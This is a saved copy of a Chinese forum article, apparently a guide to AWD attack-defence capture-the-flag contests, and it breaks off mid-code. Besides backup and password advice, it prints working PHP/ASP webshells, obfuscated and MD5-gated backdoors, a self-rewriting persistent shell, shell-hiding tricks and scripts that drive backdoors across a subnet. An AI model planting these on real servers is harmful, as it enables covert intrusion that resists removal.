@@ -1,0 +1,1771 @@
+<!DOCTYPE html>
+<!-- saved from url=(0029)https://xz.aliyun.com/t/11409 -->
+<html lang="en" data-redeviation-bs-uid="mkingffh7hr"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <title>浅谈AWD攻防赛的生存攻略 - 先知社区</title>
+    <meta name="description" content="先知社区，先知安全技术社区">
+    <meta name="viewport" content="width=device-width,initial-scale=1.0,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <link rel="icon" href="https://xz.aliyun.com/static/icon/favicon.ico" type="image/x-icon">
+    <link href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/editormd.min.css">
+    <link rel="stylesheet" href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/tango.css">
+    <link href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/bootstrap-responsive.min.css" rel="stylesheet">
+    <!-- Le styles -->
+    <link rel="stylesheet" href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/OverlayStyle.css">
+    <link rel="stylesheet" href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/topic.css">
+    <link rel="stylesheet" href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/beautify.css">
+    
+    <link rel="stylesheet" href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/editormd.css">
+    <link rel="stylesheet" href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/tango.css">
+    <link rel="stylesheet" href="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/jquery.fancybox.min.css">
+
+    <!--[if lte IE 8]>
+        <script src="http://code.jquery.com/jquery-1.11.3.min.js"></script>
+    <![endif]-->
+    
+    
+
+    <!--[if !IE]> -->
+    <script type="text/javascript" src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/jquery-2.1.3.min.js"></script>
+    
+    
+    <script src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/jquery.fancybox.min.js"></script>
+
+    <!-- <![endif]-->
+<style class="redeviation-bs-style" data-name="content">/*! (c) Philipp Koenig under GPL-3.0 */
+body>div#redeviation-bs-indicator>div{opacity:0;pointer-events:none}body>#redeviation-bs-overlay.redeviation-bs-visible,body>#redeviation-bs-sidebar.redeviation-bs-visible{opacity:1;pointer-events:auto}body.redeviation-bs-noscroll{overflow:hidden !important}body>div#redeviation-bs-indicator>div{position:absolute;transform:translate3d(-40px, 0, 0);top:0;left:0;width:40px !important;height:100%;background:rgba(0,0,0,0.5);border-radius:0 10px 10px 0;transition:opacity .3s,transform .3s;z-index:2}body>div#redeviation-bs-indicator>div>span{-webkit-mask:no-repeat center/32px;-webkit-mask-image:url(chrome-extension://jdbnofccmhefkmjbkkdkfiicjkgofkdh/img/icon-bookmark.svg);background-color:#ffffff;position:absolute;display:block;top:0;left:0;width:100%;height:100%}body>div#redeviation-bs-indicator[data-pos=right]{left:auto;right:0}body>div#redeviation-bs-indicator[data-pos=right]>div{transform:translate3d(40px, 0, 0);left:auto;right:0;border-radius:10px 0 0 10px}body>div#redeviation-bs-indicator.redeviation-bs-fullHeight>div{border-radius:0}body>div#redeviation-bs-indicator.redeviation-bs-hover>div{transform:translate3d(0, 0, 0);opacity:1}body>div#redeviation-bs-indicator[data-pos=left].redeviation-bs-has-lsb{height:100% !important;top:0 !important}body>div#redeviation-bs-indicator[data-pos=left].redeviation-bs-has-lsb>div{background:rgba(0,0,0,0)}body>div#redeviation-bs-indicator[data-pos=left].redeviation-bs-has-lsb>div>span{-webkit-mask-position-y:20px}body>#redeviation-bs-sidebar{width:350px;max-width:none;height:0;z-index:2147483646;background-color:rgba(255,255,255,0.8) !important;color-scheme:auto !important;speak:none;border:none;display:block !important;transform:translate3d(-350px, 0, 0);transition:width 0s .3s,height 0s .3s,opacity .3s,transform .3s}body>#redeviation-bs-sidebar[data-pos=right]{left:auto;right:0;transform:translate3d(350px, 0, 0)}body>#redeviation-bs-sidebar.redeviation-bs-visible{width:calc(100% + 350px);height:100%;transform:translate3d(0, 0, 0);transition:opacity .3s,transform .3s}body>#redeviation-bs-sidebar.sidepanel{width:100% !important}body>#redeviation-bs-sidebar.redeviation-bs-hideMask{background:none !important}body>#redeviation-bs-sidebar.redeviation-bs-hideMask:not(.redeviation-bs-hover){width:calc(350px + 50px)}body>#redeviation-bs-overlay{width:100%;max-width:none;height:100%;z-index:2147483647;border:none;speak:none;background:rgba(0,0,0,0.5) !important;color-scheme:auto !important;transition:opacity .3s}</style></head>
+<body>
+<!-- navbar begin -->
+<div class="navbar navbar-default">
+    <div class="navbar-inner">
+        <div class="container" style="text-align: center; position:relative;">
+            <!--[if lte IE 8]>
+            <span style="display:inline-block;margin:0 auto;color:red;">为了更好的体验，请使用IE10及以上版本</span>
+            <![endif]-->
+            <div class="brand-box">
+                <a class="brand" href="https://xz.aliyun.com/tab/1"></a>
+            </div>
+            
+                <a href="https://account.aliyun.com/login/login.htm?oauth_callback=https%3A%2F%2Fxz.aliyun.com%2Ft%2F11409&amp;from_type=xianzhi" class="pull-right anonymous-user hh_loding">
+                    登录</a>
+            
+            <div class="nav-collapse collapse">
+                <div class="search d1 text-right">
+                    <form method="get" action="https://xz.aliyun.com/search">
+                        <input type="text" placeholder="搜索" name="keyword">
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- navbar end -->
+<!-- main content begin -->
+<div id="Wrapper" class="container">
+    
+    
+    <div class="row2">
+        <div class="span10">
+            
+    
+
+
+
+    <script src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/jquery.toc.min.js"></script>
+    <script src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/toc.min.js"></script>
+    <script src="./浅谈AWD攻防赛的生存攻略 - 先知社区_files/dt.js"></script>
+    
+
+
+<div class="row box content">
+    
+    <div class="box-container">
+        <div class="main-topic">
+            <div class="clearfix user-info topic-list">
+                <p><span class="content-title ">浅谈AWD攻防赛的生存攻略</span>
+                </p>
+                <div class="topic-info">
+                <span class="info-left">
+                    <a href="https://xz.aliyun.com/u/47190">
+                        <span class="username cell"> Atkx</span></a> <span class="i-seprator"> / </span>
+                    <span> 2022-06-08 14:47:29</span><span class="i-seprator"> / </span>
+                    
+                    <span>浏览数 23709</span>
+                    
+                    
+                    <span class="content-node">
+                    
+                        <span class="label label-default label-node-first">
+                            <a href="https://xz.aliyun.com/tab/1">技术文章</a></span>
+                        <span class="label label-default">
+                            <a href="https://xz.aliyun.com/node/11">技术文章</a></span>
+                    
+                    </span>
+                </span>
+                    <span class="pull-right t-vote cell info-right"><a class="vote vote-up" href="javascript:" onclick="voteUp(11409);">
+             顶(4)</a>
+             <a class="vote vote-down" href="javascript:" onclick="voteDown(11409);">
+             踩(0)</a></span>
+                </div>
+            </div>
+            <hr>
+            <div id="topic_content" class="topic-content markdown-body">
+                <h1>AWD 规则</h1>
+<p>AWD：Attack With Defence，即攻防对抗，比赛中每个队伍维护多台服务器（一般两三台，视小组参赛人数而定），服务器中存在多个漏洞（web层、系统层、中间件层等），利用漏洞攻击其他队伍可以进行得分，加固时间段可自行发现漏洞对服务器进行加固，避免被其他队伍攻击失分。</p>
+<ul>
+<li>1.一般分配Web服务器，服务器（多数为Linux）某处存在flag（一般在根目录下）；</li>
+<li>2.可能会提供一台流量分析虚拟机，可以下载流量文件进行数据分析（较少提供）；</li>
+<li>3.flag在主办方的设定下每隔一定时间刷新一轮；</li>
+<li>4.各队一般都有一个初始分数；</li>
+<li>5.flag一旦被其他队伍拿走，该队扣除一定积分；</li>
+<li>6.得到flag的队伍加分；</li>
+<li>7.一般每个队伍会给一个低权限用户，非root权限；</li>
+<li>8.主办方会对每个队伍的服务进行check，服务器宕机扣除本轮flag分数，扣除的分值由服务check正常的队伍均分。<br>
+# 前期准备<br>
+## SSH登录<br>
+<strong>口令登录</strong><br>
+命令格式为： ssh 客户端用户名@服务器ip地址<div class="highlight"><pre><span></span><span class="x">ssh 用户名@ip</span>
+<span class="x">ssh ctf@192.168.182.130</span>
+</pre></div>
+如果不是默认的22端口，也可以使用 -p 选项来修改端口号，比如连接到服务器的2222端口<div class="highlight"><pre><span></span><span class="x">ssh -p 指定端口号 用户名@ip</span>
+<span class="x">ssh -p 2222 ctf@192.168.182.130</span>
+</pre></div>
+除此之外还可以使用Finalshell或者Xshell等图形化服务器管理软件</li>
+</ul>
+<p><strong>密钥登录</strong><br>
+用id_rsa用于登陆靶机，命令如下</p>
+<div class="highlight"><pre><span></span><span class="x">sftp -i id_rsa ctf@192.168.182.130</span>
+</pre></div>
+<h2 id="toc-0">改密码</h2>
+<p>官方在给出服务器密码时，很有可能是默认的，那就需要赶快修改自己的密码，但一般主办方给的是随机密码。</p>
+<p>如果发现每个队伍的SSH账号密码都是一样的，需要立即修改口令，如果被其他队伍改了那就gg了，同时要准备好批量脚本，一旦是默认密码，可以直接利用。</p>
+<p>SSH密码修改:</p>
+<div class="highlight"><pre><span></span>passwd
+</pre></div>
+<p>mysql密码修改:</p>
+<div class="highlight"><pre><span></span><span class="c1">#方法一</span>
+show databases<span class="p">;</span>
+use mysql
+<span class="nb">set</span> password <span class="k">for</span> root@localhost <span class="o">=</span> password<span class="o">(</span><span class="s1">'123'</span><span class="o">)</span><span class="p">;</span>
+<span class="c1">#方法二</span>
+update user <span class="nb">set</span> <span class="nv">password</span> <span class="o">=</span> PASSWORD<span class="o">(</span><span class="s1">'需要更换的密码'</span><span class="o">)</span> where <span class="nv">user</span><span class="o">=</span><span class="s1">'root'</span><span class="p">;</span>
+flush privileges<span class="p">;</span>
+show tables<span class="p">;</span>
+</pre></div>
+<p>Web后台很有可能存在弱口令，需要立即修改，也可以修改其他队伍的后台口令，为本队所用，说不定可以利用后台getshell。</p>
+<h2 id="toc-1">备份源码</h2>
+<p>比赛开始后第一时间备份服务器中web目录下的文件(/var/www/html)，备份的目的在于万一对方利用漏洞进入你的靶机将你的WWW下的目录给删除了，可以及时恢复，如果你没有备份就相当于宕机了</p>
+<p>比赛开始第一时间备份，备份网站目录及数据库，一般在 /var/www/html 目录。</p>
+<p>1.目录打包</p>
+<div class="highlight"><pre><span></span>打包
+tar -zcvf archive_name.tar.gz  directory_to_compress
+注意：如果使用tar命令打包文件夹，.index.php（隐藏类型文件）将不会被打包
+
+备份整站
+<span class="nb">cd</span> /var/www <span class="o">&amp;&amp;</span> tar -czvf /tmp/html.tgz html
+<span class="c1"># 软连接到了/app</span>
+<span class="nb">cd</span> / <span class="o">&amp;&amp;</span> tar -czvf /tmp/app.tgz app
+
+解包
+tar -zxvf archive_name.tar.gz
+</pre></div>
+<p>2.备份数据库</p>
+<ul>
+<li>备份指定的多个数据库</li>
+</ul>
+<div class="highlight"><pre><span></span>mysqldump -uroot -proot --databases DB1 DB2 &gt; /tmp/db.sql
+</pre></div>
+<p>无 lock tables 权限的解决方法</p>
+<div class="highlight"><pre><span></span>mysqldump -uroot -proot --all-databases --skip-lock-tables &gt; /tmp/db.sql
+</pre></div>
+<ul>
+<li>恢复备份（在 MySQL 终端下执行）</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="nb">source</span> FILE_PATH
+</pre></div>
+<ul>
+<li>重置 MySQL 密码（在 MySQL 终端下执行）</li>
+</ul>
+<p>方法 1</p>
+<div class="highlight"><pre><span></span><span class="nb">set</span> password <span class="k">for</span> 用户名@localhost <span class="o">=</span> password<span class="o">(</span><span class="s2">"新密码"</span><span class="o">)</span>
+</pre></div>
+<p>方法 2</p>
+<div class="highlight"><pre><span></span>mysqladmin -u用户名 -p旧密码 password 新密码
+</pre></div>
+<p>3.下载到本地</p>
+<div class="highlight"><pre><span></span>scp -P ssh_port user@host_ip:/tmp/bak.sql local_file
+</pre></div>
+<h2 id="toc-2">查找预留后门</h2>
+<p>用D盾扫描备份的文件，查找预留后门，第一时间删除自己靶机上的后门，也可以利用后门攻击其他靶机。</p>
+<p>可以使用 seay进行代码审计</p>
+<h2 id="toc-3">端口扫描</h2>
+<p>端口扫描是信息收集的一部分，需要知道目标服务器开放了哪些端口，使用端口扫描工具有御剑高速TCP全端口扫描工具、nmap和masscan等进行扫描。<br>
+所有服务器配置都是一样的，也可以看己方靶机开放了哪些端口。</p>
+<p>以下是一些服务端口的漏洞：<br>
+22：ssh弱口令<br>
+873：未授权访问漏洞<br>
+3306：mysql弱口令<br>
+6379：redis未授权访问漏洞</p>
+<h1>攻击思路</h1>
+<h2 id="toc-4">主机发现</h2>
+<p>信息收集</p>
+<ul>
+<li>nmap、Routescan</li>
+<li>Python 脚本</li>
+</ul>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">requests</span>
+<span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">255</span><span class="p">):</span> 
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">"http://192.168.1.{}"</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">x</span><span class="p">)</span> 
+    <span class="k">try</span><span class="p">:</span> 
+        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> 
+        <span class="k">print</span><span class="p">(</span><span class="n">url</span><span class="p">)</span> 
+        <span class="k">except</span><span class="p">:</span> 
+        <span class="k">pass</span>
+</pre></div>
+<h2 id="toc-5">后门利用</h2>
+<p>curl读flag</p>
+<div class="highlight"><pre><span></span>C:<span class="se">\U</span>sers<span class="se">\a</span>dmin&gt;curl <span class="s2">"http://192.168.182.130:8801/include/shell.php"</span> -d <span class="s2">"admin_ccmd=system('cat /f*');"</span>
+SL<span class="o">{</span>4a0be463dd85555090f2216795677916d2447242<span class="o">}</span>
+flag<span class="o">{</span>glzjin_wants_a_girl_friend<span class="o">}</span>
+</pre></div>
+<p>脚本</p>
+<div class="highlight"><pre><span></span><span class="err">端口</span>
+<span class="c1">#coding=utf-8</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="n">url_head</span><span class="o">=</span><span class="s2">"http://192.168.182.130"</span>   <span class="c1">#网段</span>
+<span class="n">url</span><span class="o">=</span><span class="s2">""</span>
+<span class="n">shell_addr</span><span class="o">=</span><span class="s2">"/upload/url/shell.php"</span> <span class="c1">#木马路径</span>
+<span class="n">passwd</span><span class="o">=</span><span class="s2">"pass"</span>                   <span class="c1">#木马密码</span>
+<span class="c1">#port="80"</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="n">passwd</span><span class="p">:</span> <span class="s1">'System(</span><span class="se">\'</span><span class="s1">cat /flag</span><span class="se">\'</span><span class="s1">);'</span><span class="p">}</span>
+<span class="c1"># find / -name "flag*"</span>
+
+<span class="c1">#清空上次记录</span>
+<span class="n">flag</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">"flag.txt"</span><span class="p">,</span><span class="s2">"w"</span><span class="p">)</span>
+<span class="n">flag</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="n">flag</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="s2">"flag.txt"</span><span class="p">,</span><span class="s2">"a"</span><span class="p">)</span>
+
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8000</span><span class="p">,</span><span class="mi">8004</span><span class="p">):</span>
+    <span class="n">url</span><span class="o">=</span><span class="n">url_head</span><span class="o">+</span><span class="s2">":"</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">+</span><span class="n">shell_addr</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">res</span><span class="o">=</span><span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span><span class="c1">#,timeout=1</span>
+        <span class="k">if</span> <span class="n">res</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="n">requests</span><span class="o">.</span><span class="n">codes</span><span class="o">.</span><span class="n">ok</span><span class="p">:</span>
+            <span class="n">result</span> <span class="o">=</span> <span class="n">res</span><span class="o">.</span><span class="n">text</span>
+            <span class="k">print</span> <span class="p">(</span><span class="n">result</span><span class="p">)</span>
+            <span class="n">flag</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">result</span><span class="o">+</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">)</span> 
+        <span class="k">else</span><span class="p">:</span>
+            <span class="k">print</span> <span class="p">(</span><span class="s2">"shell 404"</span><span class="p">)</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">print</span> <span class="p">(</span><span class="n">url</span><span class="o">+</span><span class="s2">" connect shell fail"</span><span class="p">)</span>
+
+<span class="n">flag</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</pre></div>
+<h2 id="toc-6">一句话木马</h2>
+<p>常用语言的一句话木马</p>
+<div class="highlight"><pre><span></span><span class="x">php： </span><span class="cp">&lt;?php</span> <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]);</span><span class="cp">?&gt;</span><span class="x">      </span><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]);</span>
+<span class="nx">asp：</span>   <span class="o">&lt;%</span><span class="k">eval</span> <span class="nx">request</span> <span class="p">(</span><span class="s2">"pass"</span><span class="p">)</span><span class="o">%&gt;</span>
+<span class="nx">aspx：</span>  <span class="o">&lt;%@</span> <span class="nx">Page</span> <span class="nx">Language</span><span class="o">=</span><span class="s2">"Jscript"</span><span class="o">%&gt;</span> <span class="o">&lt;%</span><span class="k">eval</span><span class="p">(</span><span class="nx">Request</span><span class="o">.</span><span class="nx">Item</span><span class="p">[</span><span class="s2">"pass"</span><span class="p">],</span><span class="s2">"unsafe"</span><span class="p">);</span><span class="o">%&gt;</span>
+</pre></div>
+<p>蚁剑连接get型木马，之前一直不会用蚁剑连接get型木马，这里记录一下。</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pass'</span><span class="p">]);</span>
+
+<span class="o">/</span><span class="nx">shell</span><span class="o">.</span><span class="nx">php</span><span class="o">?</span><span class="nx">pass</span><span class="o">=</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+<span class="nx">连接密码：1</span>
+</pre></div>
+<h2 id="toc-7">隐藏shell</h2>
+<p>shell很容易被发现，被删除就gg了，可以采用一些操作隐藏shell或使shell无法被删除</p>
+<p><strong>1.把shell.php命名为.shell.php</strong></p>
+<p>.shell.php在执行ls时无法被查看到，搭配ls的参数才能被发现<br>
+完整命令如下</p>
+<div class="highlight"><pre><span></span><span class="o">[</span>sss@ecs-centos-7 awd<span class="o">]</span>$ <span class="nb">echo</span> <span class="s2">"iamshell"</span>&gt;shell.php
+<span class="o">[</span>sss@ecs-centos-7 awd<span class="o">]</span>$ ls
+shell.php
+<span class="o">[</span>sss@ecs-centos-7 awd<span class="o">]</span>$ mv shell.php .shell.php
+<span class="o">[</span>sss@ecs-centos-7 awd<span class="o">]</span>$ ls
+<span class="o">[</span>sss@ecs-centos-7 awd<span class="o">]</span>$ ls -al
+总用量 <span class="m">12</span>
+drwxrwxr-x <span class="m">2</span> sss sss <span class="m">4096</span> 12月  <span class="m">29</span> <span class="m">22</span>:52 .
+drwx------ <span class="m">4</span> sss sss <span class="m">4096</span> 12月  <span class="m">29</span> <span class="m">22</span>:51 ..
+-rw-rw-r-- <span class="m">1</span> sss sss    <span class="m">9</span> 12月  <span class="m">29</span> <span class="m">22</span>:52 .shell.php
+</pre></div>
+<p><strong>2.把shell.php命名为-shell.php</strong><br>
+从上面可以看出，ls加参数才能查看到shell，那么我们直接写一个-shell.php、<br>
+命令行会把-后面的内容当成参数执行，执行即使被发现，使用rm命令进行删除，会被当成是rm的参数，就会发生报错，无法删除shell，目的也达到了</p>
+<p>完整命令如下</p>
+<div class="highlight"><pre><span></span><span class="o">[</span>sss@ecs-centos-7 awd<span class="o">]</span>$ ls
+-shell.php
+<span class="o">[</span>sss@ecs-centos-7 awd<span class="o">]</span>$ rm -shell.php 
+rm：无效选项 -- s
+Try <span class="s1">'rm ./-shell.php'</span> to remove the file <span class="s2">"-shell.php"</span>.
+Try <span class="s1">'rm --help'</span> <span class="k">for</span> more information.
+<span class="o">[</span>sss@ecs-centos-7 awd<span class="o">]</span>$ rm -rf -shell.php 
+rm：无效选项 -- s
+Try <span class="s1">'rm ./-shell.php'</span> to remove the file <span class="s2">"-shell.php"</span>.
+Try <span class="s1">'rm --help'</span> <span class="k">for</span> more information.
+</pre></div>
+<p><a href="https://blog.csdn.net/weixin_42526353/article/details/112116161" target="_blank"></a></p>
+<h2 id="toc-8">特殊的shell</h2>
+<p>shell1：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span> <span class="p">(</span><span class="nv">$_</span><span class="o">=@</span><span class="nv">$_GET</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span><span class="o">.@</span><span class="nv">$_</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span><span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>连接方式：php?2=assert密码是1。</p>
+<p>shell2：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$a</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span> <span class="mi">96</span><span class="o">^</span><span class="mi">5</span><span class="p">);</span>
+<span class="nv">$b</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span> <span class="mi">57</span><span class="o">^</span><span class="mi">79</span><span class="p">);</span>
+<span class="nv">$c</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span> <span class="mi">15</span><span class="o">^</span><span class="mi">110</span><span class="p">);</span>
+<span class="nv">$d</span><span class="o">=</span><span class="nb">chr</span><span class="p">(</span> <span class="mi">58</span><span class="o">^</span><span class="mi">86</span><span class="p">);</span>
+<span class="nv">$e</span><span class="o">=</span> <span class="s1">'($_REQUEST[C])'</span><span class="p">;</span>
+<span class="o">@</span><span class="nb">assert</span><span class="p">(</span><span class="nv">$a</span><span class="o">.</span><span class="nv">$b</span><span class="o">.</span><span class="nv">$c</span><span class="o">.</span><span class="nv">$d</span><span class="o">.</span><span class="nv">$e</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>配置为?b=))99(rhC(tseuqeR+lave</p>
+<p>shell3：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$sF</span><span class="o">=</span> <span class="s2">"PCT4BA6ODSE_"</span><span class="p">;</span><span class="nv">$s21</span><span class="o">=</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">10</span><span class="p">]);</span><span class="nv">$s22</span><span class="o">=</span><span class="err">$</span><span class="p">{</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="o">.</span><span class="nv">$sF</span><span class="p">[</span><span class="mi">2</span><span class="p">])}[</span><span class="s1">'n985de9'</span><span class="p">];</span><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$s22</span><span class="p">)){</span><span class="k">eval</span><span class="p">(</span><span class="nv">$s21</span><span class="p">(</span><span class="nv">$s22</span><span class="p">));}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>配置填n985de9=QGV2YWwoJF9QT1NUWzBdKTs=<br>
+连接密码:0（零）</p>
+<p>shell4：MD5木马</p>
+<div class="highlight"><pre><span></span>&lt;?php
+<span class="k">if</span><span class="o">(</span>md5<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'pass'</span><span class="o">])==</span><span class="s1">'d8d1a1efe0134e2530f503028a825253'</span><span class="o">)</span>
+@eval<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'cmd'</span><span class="o">])</span><span class="p">;</span>
+?&gt;
+</pre></div>
+<p>shell5：MD5木马+利用header<br>
+2021ISCC河南赛区线下赛就是这种shell，当时差点没看出来</p>
+<div class="highlight"><pre><span></span>&lt;?php
+<span class="nb">echo</span> <span class="s1">'hello'</span><span class="p">;</span>
+<span class="k">if</span><span class="o">(</span>md5<span class="o">(</span><span class="nv">$_POST</span><span class="o">[</span><span class="s1">'pass'</span><span class="o">])==</span><span class="s1">'d8d1a1efe0134e2530f503028a825253'</span><span class="o">)</span>
+<span class="k">if</span> <span class="o">(</span>@<span class="nv">$_SERVER</span><span class="o">[</span><span class="s1">'HTTP_USER_AGENT'</span><span class="o">]</span> <span class="o">==</span> <span class="s1">'flag'</span><span class="o">){</span>
+<span class="nv">$test</span><span class="o">=</span> <span class="s1">'flag'</span><span class="p">;</span>
+header<span class="o">(</span><span class="s2">"flag:</span><span class="nv">$test</span><span class="s2">"</span><span class="o">)</span><span class="p">;</span>
+<span class="o">}</span>
+?&gt;
+</pre></div>
+<h2 id="toc-9">不死马</h2>
+<p>不死马示例：</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">unlink</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+<span class="nv">$file</span> <span class="o">=</span> <span class="s1">'shell.php'</span><span class="p">;</span>
+<span class="nv">$code</span> <span class="o">=</span> <span class="s1">'&lt;?php if(md5($_POST["passwd"])=="6daf17e539bf44591fad8c81b4a293d7"){@eval($_REQUEST['</span><span class="nx">cmd</span><span class="s1">']);} ?&gt;'</span><span class="p">;</span>
+<span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">){</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="nv">$file</span><span class="p">,</span><span class="nv">$code</span><span class="p">);</span>
+    <span class="nb">system</span><span class="p">(</span><span class="s1">'touch -m -d "2018-12-01 09:10:12" shell2.php'</span><span class="p">);</span>
+    <span class="nb">usleep</span><span class="p">(</span><span class="mi">5000</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+
+<span class="x">#passwd=y0range857</span>
+<span class="x">#POST传参：passwd=y0range857&amp;a=system('ls');</span>
+</pre></div>
+<p>将这个文件上传到服务器，然后进行访问，会在该路径下一直生成一个名字为shell2.php的shell文件，然后使用caidao输入<a href="http://xxx/shell2.php?pass=pass%E7%9A%84%E8%B7%AF%E5%BE%84%EF%BC%8C%E5%AF%86%E7%A0%81%E4%B8%BAa%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%93%BE%E6%8E%A5%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%8C%E7%94%B1%E4%BA%8Epass%E6%98%AFmd5%E5%8A%A0%E5%AF%86%E5%BE%88%E9%9A%BE%E8%A2%AB%E7%A0%B4%E8%A7%A3%E4%B9%9F%E5%8F%AF%E4%BB%A5%E5%81%9A%E5%88%B0%E9%9A%90%E8%94%BD,md5%E5%80%BC%E5%8F%AF%E4%BB%A5%E9%9A%8F%E6%84%8F%E5%AE%9A%E4%B9%89%E3%80%82" target="_blank">http://xxx/shell2.php?pass=pass的路径，密码为a就可以链接一句话，由于pass是md5加密很难被破解也可以做到隐蔽,md5值可以随意定义。</a></p>
+<p>写入shell， at.php内容</p>
+<div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nb">ignore_user_abort</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
+<span class="nb">set_time_limit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="nb">unlink</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
